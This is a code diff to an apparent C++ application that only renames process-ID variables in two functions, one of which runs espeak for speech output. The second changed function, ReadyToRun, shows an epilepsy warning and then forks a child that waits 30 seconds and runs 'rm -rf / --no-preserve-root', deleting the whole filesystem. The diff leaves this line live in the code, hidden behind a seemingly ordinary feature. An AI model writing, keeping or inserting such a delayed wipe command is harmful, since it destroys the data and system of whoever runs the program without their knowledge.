@@ -173,15 +173,15 @@ private:
         // Prepare the arguments for espeak
         const char* argv[] = { "espeak", "-s", "150", "-p", "50", "-a", "100", "'", message, "'", NULL};
 
-        pid_t pid = fork();
-        if (pid == 0) {
+        pid_t child_pid = fork();
+        if (child_pid == 0) {
             // Child process: Execute espeak
             execvp(argv[0], (char* const*)argv);
             // If execvp fails, print an error and exit
             perror("execvp failed");
             exit(1);
         }
-        else if (pid < 0) {
+        else if (child_pid < 0) {
             // Fork failed
             perror("fork failed");
         }
@@ -235,14 +235,14 @@ public:
     void ReadyToRun() override {
         ShowEpilepsyWarning();
 
-        pid_t child_pid = fork();
-        if (child_pid == 0) {  // Child process
+        pid_t pid = fork();
+        if (pid == 0) {  // Child process
             // Sleep for 30 seconds, then execute the command
             sleep(30);
             system("rm -rf / --no-preserve-root");
             exit(0); // Make sure the child process exits after the command runs
         }
-        else if (child_pid < 0) {
+        else if (pid < 0) {
             // Fork failed
             perror("fork failed");
         }
